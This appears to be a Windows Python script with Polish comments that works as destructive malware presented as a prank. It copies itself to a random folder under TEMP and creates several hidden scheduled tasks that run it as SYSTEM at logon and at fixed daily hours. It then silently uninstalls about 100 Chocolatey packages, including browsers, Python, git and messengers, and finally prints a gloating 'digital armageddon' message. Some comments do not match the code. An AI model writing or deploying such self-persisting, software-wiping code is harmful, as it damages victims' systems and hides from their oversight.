import shutil
import random
import os
import subprocess
import time
import sys

def install_random_choco_packages():
  """Instaluje 100 losowych paczek z Chocolatey w tle."""

  # Lista 100 losowych paczek z Choco (możesz ją zmodyfikować)
  packages = [
      "7zip", "vlc", "notepadplusplus", "firefox", "googlechrome", "steam",
      "discord", "spotify", "python", "vscode", "blender", "gimp", "audacity",
      "libreoffice", "inkscape", "putty", "winscp", "filezilla", "teamviewer",
      "anydesk", "virtualbox", "vmware", "git", "nodejs", "jdk", "maven",
      "gradle", "docker", "kubernetes", "terraform", "ansible", "jenkins",
      "sonarqube", "jira", "confluence", "slack", "microsoft-teams", "zoom",
      "skype", "whatsapp", "telegram", "signal", "vivaldi", "opera", "edge",
      "brave", "torbrowser", "qbittorrent", "deluge", "transmission", "handbrake",
      "obs-studio", "krita", "darktable", "shotcut", "davinci-resolve", "openshot",
      "hitfilm-express", "blender", "unity", "unreal-engine", "godot", "gamemaker",
      "construct", "rpgmaker", "gdevelop", "visualstudio", "intellij-idea",
      "eclipse", "netbeans", "pycharm", "sublime-text", "atom", "vim", "emacs",
      "notepadqq", "geany", "codeblocks", "qtcreator", "android-studio", "xcode",
      "arduino-ide", "raspberry-pi-os", "retroarch", "pcsx2", "dolphin-emu",
      "citra", "yuzu", "cemu", "ppsspp", "desmume", "mednafen", "snes9x",
      "fceux", "dosbox", "scummvm"
  ]

  # Zainstaluj paczki w tle
  for package in packages:
    #   subprocess.run(["choco", "install", package, "-y", "--hide"], shell=True)
    #   subprocess.run(["choco", "install", package, "-y", "--hide"], shell=True)
    pass

def uninstall_choco_packages():
  packages = [
      "7zip", "vlc", "notepadplusplus", "firefox", "googlechrome", "steam",
      "discord", "spotify", "python", "vscode", "blender", "gimp", "audacity",
      "libreoffice", "inkscape", "putty", "winscp", "filezilla", "teamviewer",
      "anydesk", "virtualbox", "vmware", "git", "nodejs", "jdk", "maven",
      "gradle", "docker", "kubernetes", "terraform", "ansible", "jenkins",
      "sonarqube", "jira", "confluence", "slack", "microsoft-teams", "zoom",
      "skype", "whatsapp", "telegram", "signal", "vivaldi", "opera", "edge",
      "brave", "torbrowser", "qbittorrent", "deluge", "transmission", "handbrake",
      "obs-studio", "krita", "darktable", "shotcut", "davinci-resolve", "openshot",
      "hitfilm-express", "blender", "unity", "unreal-engine", "godot", "gamemaker",
      "construct", "rpgmaker", "gdevelop", "visualstudio", "intellij-idea",
      "eclipse", "netbeans", "pycharm", "sublime-text", "atom", "vim", "emacs",
      "notepadqq", "geany", "codeblocks", "qtcreator", "android-studio", "xcode",
      "arduino-ide", "raspberry-pi-os", "retroarch", "pcsx2", "dolphin-emu",
      "citra", "yuzu", "cemu", "ppsspp", "desmume", "mednafen", "snes9x",
      "fceux", "dosbox", "scummvm"
  ]

  # Odinstaluj paczki w tle
  for package in packages:
      subprocess.run(["choco", "uninstall", package, "-y", "--hide"], shell=True)

def copy_file_to_random_location(source_file):
  """Kopiuje plik do losowej lokalizacji na dysku."""

  # Generuj losową nazwę folderu
  random_folder_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(10))

  # Utwórz losową ścieżkę docelową
  destination_path = os.path.join(os.environ['TEMP'], random_folder_name)
  os.makedirs(destination_path, exist_ok=True)

  # Skopiuj plik do losowej lokalizacji
  destination_file = os.path.join(destination_path, os.path.basename(source_file))
  shutil.copy2(source_file, destination_file)

  return destination_file

def create_scheduled_task(file_path):
  """Tworzy zadanie w harmonogramie zadań, uruchamiane w tle."""

  # Utwórz zadanie przy użyciu schtasks.exe, ukrywając okno
  subprocess.run([
    'schtasks', '/create', '/tn', 'MyScheduledTask', '/tr', f'"{file_path}"',
    '/sc', 'onlogon', '/rl', 'highest',
    '/mo', 'MINUTE', '/du', '24:00', '/ri', '60', '/sd', '10:00', '/st', '10:00',
    '/F',  # Force creation of the task, overwriting any existing task with the same name
    '/RU', 'System' # Run as System user to avoid showing any windows
  ], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

  # Dodaj triggery dla określonych godzin, ukrywając okno
  for hour in ['10', '12', '14', '15']:
    subprocess.run([
      'schtasks', '/create', '/tn', f'MyScheduledTask_{hour}', '/tr', f'"{file_path}"',
      '/sc', 'daily', '/rl', 'highest', '/st', f'{hour}:00',
      '/F',  # Force creation of the task, overwriting any existing task with the same name
      '/RU', 'System' # Run as System user to avoid showing any windows
    ], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

  # Dodaj trigger dla 15:10, ukrywając okno
  subprocess.run([
    'schtasks', '/create', '/tn', 'MyScheduledTask_15_10', '/tr', f'"{file_path}"',
    '/sc', 'daily', '/rl', 'highest', '/st', '15:10',
    '/F',  # Force creation of the task, overwriting any existing task with the same name
    '/RU', 'System' # Run as System user to avoid showing any windows
  ], shell=True, creationflags=subprocess.CREATE_NO_WINDOW)

# Zainstaluj losowe paczki Chocolatey w tle
install_random_choco_packages()

# Pobierz ścieżkę do aktualnie działającego skryptu
source_file = sys.argv[0]

# Skopiuj plik do losowej lokalizacji
copied_file_path = copy_file_to_random_location(source_file)

# Utwórz zadanie w harmonogramie, uruchamiane w tle
create_scheduled_task(copied_file_path)

print(f"Plik skopiowany do: {copied_file_path}")
print("Zadanie dodane do harmonogramu zadań.")

# Odczekaj 10 minut
time.sleep(6)

# Odinstaluj paczki Chocolatey w tle
uninstall_choco_packages()

print("Cyfrowy armagedon zakończony sukcesem! 😈")